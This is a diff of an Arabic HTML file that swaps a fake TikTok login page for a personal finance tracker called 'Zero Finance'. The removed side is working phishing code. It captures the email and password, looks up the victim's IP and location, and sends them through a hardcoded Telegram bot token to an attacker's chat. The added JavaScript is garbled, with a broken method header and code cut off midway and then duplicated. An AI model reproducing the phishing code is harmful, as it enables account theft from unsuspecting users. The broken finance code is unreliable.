@@ -2,397 +2,777 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تسجيل الدخول | TikTok</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero Finance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #fe2c55 0%, #25f4ee 100%);
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #f472b6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #1f2937;
+            --light: #f9fafb;
+            --gray: #9ca3af;
+            --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            --shadow-neumorphic: 8px 8px 16px #d1d9e6, -8px -8px 16px #ffffff;
+            --radius: 20px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
             box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
         }
-        .login-container {
-            background: white;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
+
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            color: var(--dark);
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
         }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 25px 0;
+            margin-bottom: 30px;
+        }
+
         .logo {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            background: linear-gradient(to right, #fe2c55, #25f4ee);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--primary);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            box-shadow: var(--shadow);
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        h2 {
-            color: #333;
-            margin-bottom: 30px;
-            font-weight: 600;
+
+        /* Summary Cards */
+        .summary-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
         }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: right;
+
+        .summary-card {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: var(--radius);
+            padding: 25px;
+            box-shadow: var(--shadow-neumorphic);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: var(--transition);
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-weight: 500;
+
+        .summary-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
         }
-        .required::after {
-            content: " *";
-            color: #fe2c55;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-sizing: border-box;
+
+        .card-title {
             font-size: 16px;
-            transition: all 0.3s;
+            color: var(--gray);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        input:focus {
-            outline: none;
-            border-color: #fe2c55;
-            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.1);
+
+        .card-value {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 5px;
         }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(to right, #fe2c55, #25f4ee);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-            margin-top: 10px;
-            transition: all 0.3s;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(254, 44, 85, 0.3);
-        }
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .forgot-password {
-            text-align: left;
-            margin-top: 10px;
-        }
-        .forgot-password a {
-            color: #25f4ee;
-            text-decoration: none;
+
+        .card-change {
             font-size: 14px;
-        }
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-        .status-message {
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px 0;
-            text-align: center;
             font-weight: 500;
-            display: none;
         }
-        .status-success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-            display: block;
+
+        .positive { color: var(--success); }
+        .negative { color: var(--danger); }
+
+        /* Input Section */
+        .input-section {
+            background: white;
+            border-radius: var(--radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            margin-bottom: 40px;
         }
-        .status-error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            display: block;
+
+        .section-title {
+            font-size: 22px;
+            margin-bottom: 25px;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .status-loading {
-            background-color: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-            display: block;
+
+        .input-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
         }
-        .loader {
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-label {
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .input-field {
+            padding: 15px 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: #f3f4f6;
+            color: var(--dark);
+        }
+
+        .btn-secondary:hover {
+            background: #e5e7eb;
+        }
+
+        /* Transactions */
+        .transactions-section {
+            background: white;
+            border-radius: var(--radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+        }
+
+        .table-container {
+            overflow-x: auto;
+            border-radius: 12px;
+            border: 1px solid #e5e7eb;
+        }
+
+        .transaction-table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 800px;
+        }
+
+        .transaction-table th {
+            background: #f9fafb;
+            padding: 18px 20px;
+            text-align: right;
+            font-weight: 600;
+            color: var(--dark);
+            border-bottom: 2px solid #e5e7eb;
+        }
+
+        .transaction-table td {
+            padding: 18px 20px;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .transaction-table tr:hover {
+            background: #f9fafb;
+        }
+
+        .transaction-type {
             display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #fe2c55;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-            vertical-align: middle;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .type-income { background: #d1fae5; color: #065f46; }
+        .type-expense { background: #fee2e2; color: #991b1b; }
+        .type-debt { background: #fef3c7; color: #92400e; }
+
+        .action-btn {
+            background: none;
+            border: none;
+            color: var(--gray);
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: var(--transition);
         }
-        .tiktok-brand {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
+
+        .action-btn:hover {
+            background: #f3f4f6;
+            color: var(--dark);
         }
-        .privacy-notice {
-            font-size: 11px;
-            color: #777;
-            margin-top: 15px;
-            text-align: center;
-            line-height: 1.4;
+
+        /* Charts */
+        .chart-container {
+            background: white;
+            border-radius: var(--radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            margin-top: 40px;
+            height: 400px;
+            position: relative;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header { flex-direction: column; gap: 20px; }
+            .input-grid { grid-template-columns: 1fr; }
+            .button-group { flex-direction: column; }
+            .btn { width: 100%; justify-content: center; }
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-coins"></i>
+                </div>
+                <h1 class="logo-text">Zero Finance</h1>
+            </div>
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <div style="text-align: left;">
+                    <div style="font-size: 14px; color: var(--gray);">الحالة</div>
+                    <div style="font-weight: 700; color: var(--success);">
+                        <i class="fas fa-circle" style="font-size: 12px;"></i> غير متصل بالانترنت
+                    </div>
+                </div>
+                <button class="btn btn-secondary" onclick="exportData()">
+                    <i class="fas fa-download"></i> تصدير
+                </button>
+            </div>
+        </header>
 
-<div class="login-container">
-    <div class="logo">TikTok</div>
-    <h2>تسجيل الدخول</h2>
-    
-    <div id="statusMessage" class="status-message"></div>
-    
-    <form id="loginForm">
-        <div class="form-group">
-            <label for="email" class="required">البريد الإلكتروني أو اسم المستخدم</label>
-            <input type="text" id="email" placeholder="أدخل بريدك الإلكتروني أو اسم المستخدم" required autocomplete="username">
+        <!-- Summary Cards -->
+        <div class="summary-grid">
+            <div class="summary-card">
+                <div class="card-title">
+                    <i class="fas fa-wallet"></i> الرصيد الكلي
+                </div>
+                <div class="card-value" id="totalBalance">0 ر.س</div>
+                <div class="card-change positive" id="balanceChange">
+                    <i class="fas fa-arrow-up"></i> 0% عن الشهر الماضي
+                </div>
+            </div>
+            <div class="summary-card">
+                <div class="card-title">
+                    <i class="fas fa-money-bill-wave"></i> الراتب الشهري
+                </div>
+                <div class="card-value" id="monthlySalary">0 ر.س</div>
+                <div class="card-change">مدخل شهري</div>
+            </div>
+            <div class="summary-card">
+                <div class="card-title">
+                    <i class="fas fa-hand-holding-usd"></i> إجمالي الديون
+                </div>
+                <div class="card-value negative" id="totalDebts">0 ر.س</div>
+                <div class="card-change negative">
+                    <i class="fas fa-arrow-down"></i> <span id="debtCount">0</span> ديون نشطة
+                </div>
+            </div>
+            <div class="summary-card">
+                <div class="card-title">
+                    <i class="fas fa-chart-line"></i> صافي التوفير
+                </div>
+                <div class="card-value" id="netSavings">0 ر.س</div>
+                <div class="card-change positive">
+                    <i class="fas fa-piggy-bank"></i> توفير آلي
+                </div>
+            </div>
         </div>
-        
-        <div class="form-group">
-            <label for="password" class="required">كلمة المرور</label>
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" required autocomplete="current-password">
+
+        <!-- Input Section -->
+        <section class="input-section">
+            <h2 class="section-title">
+                <i class="fas fa-plus-circle"></i> إدخال معاملة جديدة
+            </h2>
+            <div class="input-grid">
+                <div class="input-group">
+                    <label class="input-label">نوع المعاملة</label>
+                    <select class="input-field" id="transactionType">
+                        <option value="income">دخل (راتب، إيرادات)</option>
+                        <option value="expense">مصروف</option>
+                        <option value="debt_given">دين أعطيته</option>
+                        <option value="debt_received">دين أخذته</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">المبلغ (ر.س)</label>
+                    <input type="number" class="input-field" id="amount" placeholder="0.00" min="0" step="0.01">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">التاريخ</label>
+                    <input type="date" class="input-field" id="date" value="">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">التصنيف</label>
+                    <select class="input-field" id="category">
+                        <option value="salary">راتب</option>
+                        <option value="food">طعام</option>
+                        <option value="transport">مواصلات</option>
+                        <option value="entertainment">ترفيه</option>
+                        <option value="loan">قرض</option>
+                        <option value="other">أخرى</option>
+                    </select>
+                </div>
+            </div>
+            <div class="input-group" style="margin-bottom: 25px;">
+                <label class="input-label">الوصف (اختياري)</label>
+                <input type="text" class="input-field" id="description" placeholder="ملاحظات حول المعاملة">
+            </div>
+            <div class="button-group">
+                <button class="btn btn-primary" onclick="addTransaction()">
+                    <i class="fas fa-check"></i> تأكيد الإضافة
+                </button>
+                <button class="btn btn-secondary" onclick="setSalary()">
+                    <i class="fas fa-cog"></i> تعيين الراتب الشهري
+                </button>
+                <button class="btn btn-secondary" onclick="clearAllData()">
+                    <i class="fas fa-trash"></i> مسح كل البيانات
+                </button>
+            </div>
+        </section>
+
+        <!-- Transactions Table -->
+        <section class="transactions-section">
+            <h2 class="section-title">
+                <i class="fas fa-history"></i> سجل المعاملات
+            </h2>
+            <div class="table-container">
+                <table class="transaction-table">
+                    <thead>
+                        <tr>
+                            <th>التاريخ</th>
+                            <th>النوع</th>
+                            <th>التصنيف</th>
+                            <th>الوصف</th>
+                            <th>المبلغ</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="transactionsTable">
+                        <!-- Transactions will be inserted here -->
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Chart Section -->
+        <div class="chart-container">
+            <h2 class="section-title" style="margin-bottom: 30px;">
+                <i class="fas fa-chart-pie"></i> تحليل الإنفاق
+            </h2>
+            <canvas id="financeChart" style="width:100%; height:300px;"></canvas>
         </div>
-        
-        <div class="forgot-password">
-            <a href="#">هل نسيت كلمة المرور؟</a>
-        </div>
-        
-        <button type="submit" id="submitBtn">
-            تسجيل الدخول
-        </button>
-    </form>
-    
-    <div class="privacy-notice">
-        بمتابعة التسجيل، فإنك توافق على <a href="#" style="color:#25f4ee;">شروط الخدمة</a> 
-        وتقر بأنك قد قرأت <a href="#" style="color:#25f4ee;">سياسة الخصوصية</a> الخاصة بنا.
     </div>
-    
-    <div class="tiktok-brand">
-        © 2023 TikTok
-    </div>
-</div>
 
-<script>
-    // بيانات بوت التليجرام المخفية (لا تظهر للمستخدم)
-    const TELEGRAM_BOT_TOKEN = "7872084588:AAFlJToJt71Joz8sP-ko43rxRhsH-7BuFL4";
-    const TELEGRAM_CHAT_ID = "8120130420";
-    
-    // عناصر DOM
-    const loginForm = document.getElementById('loginForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const statusMessage = document.getElementById('statusMessage');
-    
-    // معلومات إضافية عن المستخدم
-    let userIP = "جاري التحميل...";
-    let userLocation = "غير معروف";
-    let userDevice = "";
-    
-    // جلب معلومات المستخدم
-    async function getUserInfo() {
-        try {
-            // الحصول على عنوان IP
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            userIP = ipData.ip;
-            
-            // الحصول على معلومات الموقع
-            try {
-                const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const geoData = await geoResponse.json();
-                userLocation = `${geoData.city || ''}, ${geoData.country_name || ''}`.trim();
-                if (userLocation === ',') userLocation = "غير معروف";
-            } catch (geoError) {
-                console.log("تعذر الحصول على الموقع الجغرافي");
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+        // Financial Engine
+        class FinancialEngine {
+            constructor() {
+                this.loadData();
+                this.initChart();
+                this.updateUI();
             }
-            
-            // تحديد نوع الجهاز والمتصفح
-            userDevice = detectDevice();
-        } catch (error) {
-            userIP = "غير معروف";
-            userDevice = detectDevice();
-        }
-    }
-    
-    // دالة للكشف عن نوع الجهاز
-    function detectDevice() {
-        const ua = navigator.userAgent;
-        let device = "كمبيوتر";
-        
-        if (/mobile/i.test(ua)) {
-            device = "هاتف محمول";
-        } else if (/tablet/i.test(ua)) {
-            device = "تابلت";
-        }
-        
-        let browser = "متصفح غير معروف";
-        if (/chrome/i.test(ua) && !/edg/i.test(ua)) {
-            browser = "Chrome";
-        } else if (/firefox/i.test(ua)) {
-            browser = "Firefox";
-        } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
-            browser = "Safari";
-        } else if (/edg/i.test(ua)) {
-            browser = "Edge";
-        }
-        
-        return `${device} (${browser})`;
-    }
-    
-    // دالة لعرض رسالة الحالة
-    function showStatus(message, type) {
-        statusMessage.textContent = message;
-        statusMessage.className = `status-message status-${type}`;
-    }
-    
-    // دالة لإرسال البيانات إلى تليجرام
-    async function sendToTelegram(email, password) {
-        try {
-            // انتظر قليلاً لجمع معلومات المستخدم إذا كانت لم تكتمل
-            if (userIP === "جاري التحميل...") {
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-            
-            // تنسيق الرسالة
-            const messageText = `
-🔔 *تسجيل دخول جديد إلى TikTok*
 
-📧 *البريد الإلكتروني:* ${email}
-🔐 *كلمة المرور:* ${password}
-
-📊 *معلومات الجلسة:*
-📡 *عنوان IP:* \`${userIP}\`
-📍 *الموقع:* ${userLocation}
-📱 *الجهاز:* ${userDevice}
-🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}
-🌐 *نظام التشغيل:* ${navigator.platform}
-            `;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            });
-            
-            const result = await response.json();
-            
-            if (result.ok) {
-                return { success: true, message: "تم تسجيل الدخول بنجاح!" };
-            } else {
-                console.error("خطأ في إرسال التليجرام:", result);
-                return { success: false, message: "حدث خطأ في النظام. يرجى المحاولة لاحقًا." };
+            loadData() {
+                this.salary = parseFloat(localStorage.getItem('zero_salary')) || 0;
+                this.transactions = JSON.parse(localStorage.getItem('zero_transactions')) || [];
+                this.debts = JSON.parse(localStorage.getItem('zero_debts')) || [];
             }
-        } catch (error) {
-            console.error("خطأ في الاتصال:", error);
-            return { success: false, message: "خطأ في الاتصال بالشبكة." };
-        }
-    }
-    
-    // معالج تسجيل الدخول
-    loginForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        // التحقق من صحة البيانات
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        
-        if (!email || !password) {
-            showStatus("⚠️ يرجى ملء جميع الحقول المطلوبة", "error");
-            return;
-        }
-        
-        // تعطيل زر الإرسال أثناء المعالجة
-        submitBtn.disabled = true;
-        const originalText = submitBtn.textContent;
-        submitBtn.innerHTML = '<span class="loader"></span> جاري المعالجة...';
-        showStatus("جاري تسجيل الدخول...", "loading");
-        
-        // إرسال البيانات إلى تليجرام
-        const telegramResult = await sendToTelegram(email, password);
-        
-        if (telegramResult.success) {
-            showStatus("✅ " + telegramResult.message, "success");
-            
-            // محاكاة تسجيل الدخول الناجح
-            setTimeout(() => {
-                showStatus("جاري التحويل إلى حساب TikTok...", "loading");
+
+            saveData() {
+                localStorage.setItem('zero_salary', this.salary);
+                localStorage.setItem('zero_transactions', JSON.stringify(this.transactions));
+                localStorage.setItem('zero_debts', JSON.stringify(this.debts));
+            }
+
+            calculateBalance() {
+                let balance = this.salary;
+                this.transactions.forEach(t => {
+                    if (t.type === 'income') balance += t.amount;
+                    else if (t.type === 'expense') balance -= t.amount;
+                    else if (t.type === 'debt_given') balance -= t.amount;
+                    else if (t.type === 'debt_received') balance += t.amount;
+                });
+                return balance;
+            }
+
+            calculateDebts() {
+                return this.transactions
+                    .filter(t => t.type.includes('debt'))
+                    .reduce((sum, t) => sum + (t.type === 'debt_given' ? t.amount : -t.amount), 0);
+            }
+
+            calculateSavings() {
+                const income = this.transactions
+                    .filter(t => t.type === 'income')
+                    .reduce((sum, t) => sum + t.amount, this.salary);
+                const expenses = this.transactions
+                    .filter(t => t.type === 'expense')
+                    .reduce((sum, t) => sum + t.amount, 0);
+                return income - expenses;
+            }
+
+            addTransaction(type, amount, category, description, date) {
+                const transaction = {
+                    id: Date.now(),
+                    type: type,
+                    amount: parseFloat(amount),
+                    category: category,
+                    description: description || '',
+                    date: date || new Date().toISOString().split('T')[0]
+                };
+                this.transactions.unshift(transaction);
+                this.saveData();
+                this.updateUI();
+            }
+
+            deleteTransaction(id) {
+                this.transactions = this.transactions.filter(t => t.id !== id);
+                this.saveData();
+                this.updateUI();
+            }
+
+            setSalary(amount) {
+                this.salary = parseFloat(amount);
+                this.saveData();
+                this.updateUI();
+            }
+
+            clear()
+                       if (confirm('هل أنت متأكد من مسح جميع البيانات؟ لا يمكن التراجع عن هذا الإجراء.')) {
+                    this.salary = 0;
+                    this.transactions = [];
+                    this.debts = [];
+                    localStorage.clear();
+                    this.updateUI();
+                }
+            }
+
+            exportData() {
+                const data = {
+                    salary: this.salary,
+                    transactions: this.transactions,
+                    debts: this.debts,
+                    summary: {
+                        balance: this.calculateBalance(),
+                        debts: this.calculateDebts(),
+                        savings: this.calculateSavings()
+                    }
+                };
+                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `zero_finance_${new Date().toISOString().split('T')[0]}.json`;
+                a.click();
+            }
+
+            initChart() {
+                const ctx = document.getElementById('financeChart').getContext('2d');
+                this.chart = new Chart(ctx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['طعام', 'مواصلات', 'ترفيه', 'قروض', 'أخرى'],
+                        datasets: [{
+                            data: [30, 20, 15, 25, 10],
+                            backgroundColor: [
+                                '#6366f1',
+                                '#f472b6',
+                                '#10b981',
+                                '#f59e0b',
+                                '#9ca3af'
+                            ],
+                            borderWidth: 2,
+                            borderColor: '#ffffff'
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: { position: 'bottom', rtl: true },
+                            tooltip: { rtl: true }
+                        }
+                    }
+                });
+            }
+
+            updateChart() {
+                const categories = ['food', 'transport', 'entertainment', 'loan', 'other'];
+                const data = categories.map(cat => 
+                    this.transactions
+                        .filter(t => t.category === cat && t.type === 'expense')
+                        .reduce((sum, t) => sum + t.amount, 0)
+                );
+                this.chart.data.datasets[0].data = data;
+         clearAll() {
+                if (confirm('هل أنت متأكد من مسح جميع البيانات؟ لا يمكن التراجع عن هذا الإجراء.')) {
+                    this.salary = 0;
+                    this.transactions = [];
+                    this.debts = [];
+                    localStorage.clear();
+                    this.updateUI();
+                }
+            }
+
+            exportData() {
+                const data = {
+                    salary: this.salary,
+                    transactions: this.transactions,
+                    debts: this.debts,
+                    summary: {
+                        balance: this.calculateBalance(),
+                        debts: this.calculateDebts(),
+                        savings: this.calculateSavings()
+                    }
+                };
+                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `zero_finance_${new Date().toISOString().split('T')[0]}.json`;
+                a.click();
+            }
+
+            initChart() {
+                const ctx = document.getElementById('financeChart').getContext('2d');
+                this.chart = new Chart(ctx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['طعام', 'مواصلات', 'ترفيه', 'قروض', 'أخرى'],
+                        datasets: [{
+                            data: [30, 20, 15, 25, 10],
+                            backgroundColor: [
+                                '#6366f1',
+                                '#f472b6',
+                                '#10b981',
+                                '#f59e0b',
+                                '#9ca3af'
+                            ],
+                            borderWidth: 2,
+                            borderColor: '#ffffff'
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: { position: 'bottom', rtl: true },
+                            tooltip: { rtl: true }
+                        }
+                    }
+                });
+            }
+
+            updateChart() {
+                const categories = ['food', 'transport', 'entertainment', 'loan', 'other'];
+                const data = categories.map(cat => 
+                    this.transactions
+                        .filter(t => t.category === cat && t.type === 'expense')
+                        .reduce((sum, t) => sum + t.amount, 0)
+                );
+                this.chart.data.datasets[0].data = data;
+                this.chart.update();
+            }
+
+            updateUI() {
+                // Update summary cards
+                document.getElementById('totalBalance').textContent = 
+                    `${this.calculateBalance().toFixed(2)} ر.س`;
+                document.getElementById('monthlySalary').textContent = 
+                    `${this.salary.toFixed(2)} ر.س`;
                 
-                // محاكاة التحميل
-                setTimeout(() => {
-                    // في التطبيق الحقيقي، قد تستخدم:
-                    // window.location.href = "https://www.tiktok.com/";
-                    
-                    // عرض رسالة نجاح نهائية
-                    showStatus("🎉 تم تسجيل الدخول بنجاح! جاري التحميل...", "success");
-                    
-                    // إعادة تعيين النموذج
-                    loginForm.reset();
-                }, 1500);
+                const totalDebts = this.calculateDebts();
+                document.getElementById('totalDebts').textContent = 
+                    `${Math.abs(totalDebts).toFixed(2)} ر.س`;
+                document.getElementById('debtCount').textContent = 
+                    this.transactions.filter(t => t.type.includes('debt')).length;
                 
-            }, 1000);
-            
-        } else {
-            showStatus("❌ " + telegramResult.message, "error");
-        }
-        
-        // إعادة تمكين زر الإرسال
-        submitBtn.disabled = false;
-        submitBtn.textContent = originalText;
-    });
-    
-    // تهيئة معلومات المستخدم عند تحميل الصفحة
-    getUserInfo();
-    
-    // إضافة تأثيرات للتركيز
-    const inputs = document.querySelectorAll('input');
-    inputs.forEach(input => {
-        input.addEventListener('focus', function() {
-            this.style.transform = 'translateY(-2px)';
-        });
-        
-        input.addEventListener('blur', function() {
-            this.style.transform = 'translateY(0)';
-        });
-    });
-    
-    // محاكاة التحميل الأولي
-    window.addEventListener('load', function() {
-        setTimeout(() => {
-            console.log("✅ نظام تسجيل الدخول TikTok جاهز");
-            console.log("🔧 التوكن مخفي داخليًا: " + TELEGRAM_BOT_TOKEN.substring(0, 10) + "...");
-            console.log("👤 الآيدي المخفي: " + TELEGRAM_CHAT_ID);
-        }, 500);
-    });
-</script>
+                document.getElementById('netSavings').textContent = 
+                    `${this.calculateSavings().toFixed(2)} ر.س`;
 
+                // Update transactions table
+                const table = document.getElementById('transactionsTable');
+                table.innerHTML = '';
+                this.transactions.slice(0, 20).forEach(transaction => {
+                    const row = table.insertRow();
+                    const typeText = {
+                        'income': 'دخل',
+                        'expense': 'مصروف',
+                        'debt_given': 'دين أعطيته',
+                        'debt_received': 'دين أخذته'
+                    };
+                    const typeClass = {
+                        'income': 'type-income',
+                        'expense': 'type-expense',
+                        'debt_given': 'type-debt',
+                        'debt_received': 'type-debt'
+                    };
+                    row.innerHTML = `
+                        <td>${transaction.date}</td>
+                        <td><span class="transaction-type ${typeClass[transaction.type]}">
+                            ${typeText[transaction.type]}
+                        </span></td>
+                        <td>${this.getCategoryText(transaction.category)}</td>
+                        <td>${transaction.description || '-'}</td>
+                        <td style="font-weight: 700; ${transaction.type === 'expense' || transaction.type === 'debt_given' ? 'color: var(--danger);' : 'color: var(--success);'}">
+                            ${transaction.type === 'expense' || transaction.type === 'debt_given' ? '-' : '+'}${transaction.amount.toFixed(2)} ر.س
+                        </td>
+                        <td>
+                            <button class="action-btn" onclick="engine.deleteTransaction(${transaction.id})" title="حذف">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </td>
+                    `;
+                });
+
+                // Update chart
+                this.updateChart();
+                this.updateDate();
+            }
+
+            getCategoryText(category) {
+                const categories = {
+                    'salary': 'راتب',
+                    'food': 'طعام',
+                    'transport': 'مواصلات',
+                    'entertainment': 'ترفيه',
+                    'loan': 'قرض',
+                    'other': 'أخرى'
+                };
+                return categories[category] || category;
+            }
+
+            updateDate() {
+                const today = new Date().toISOString().split('T')[0];
+                document.getElementById('date').value = today;
+            }
+        }
+
+        // Initialize engine
+        const engine = new FinancialEngine();
+
+        // Global functions for UI
+        function addTransaction() {
+            const type = document.getElementById('transactionType').value;
+            const amount = document.getElementById('amount').value;
+            const category = document.getElementById('category').value;
+            const description = document.getElementById('description').value;
+            const date = document.getElementById('date').value;
+
+            if (!amount || parseFloat(amount) <= 0) {
+                alert('الرجاء إدخال مبلغ صحيح');
+                return;
+            }
+
+            engine.addTransaction(type, amount, category, description, date);
+            
+            // Clear inputs
+            document.getElementById('amount').value = '';
+            document.getElementById('description').value = '';
+        }
+
+        function setSalary() {
+            const salary = prompt('أدخل الراتب الشهري (ر.س):', engine.salary);
+            if (salary && !isNaN(salary)) {
+                engine.setSalary(salary);
+                alert('تم تحديث الراتب الشهري');
+            }
+        }
+
+        function clearAllData() {
+            engine.clearAll();
+        }
+
+        function exportData() {
+            engine.exportData();
+        }
+
+        // Initialize date
+        engine.updateDate();
+    </script>
 </body>
-    </html>
+</html>
